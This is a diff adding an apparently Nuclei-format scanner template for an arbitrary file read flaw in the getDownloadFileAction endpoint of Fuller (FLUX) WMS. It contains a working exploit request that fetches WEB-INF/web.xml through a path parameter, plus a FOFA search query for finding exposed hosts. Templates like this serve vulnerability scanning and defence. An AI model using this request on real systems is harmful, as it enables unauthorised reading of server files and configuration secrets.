@@ -1,0 +1,31 @@
+id: fuller-wms-getDownloadFileAction-fileread
+info:
+  name: 富勒仓储管理系统 getDownloadFileAction 存在任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: debody="/logincenterapp/ValidateImageService" || title="FLUX WMS生产环境"mo
+    tips:
+    repair:
+    version:
+  tags: fileread,fuller-wms
+
+http:
+  - raw:
+      - |
+        GET /a00webres/getDownloadFileAction?dowmLoadUrl=WEB-INF/web.xml&fileName=web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.401.35 Safari/537.36
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'<?xml','web-app')
+        condition: and
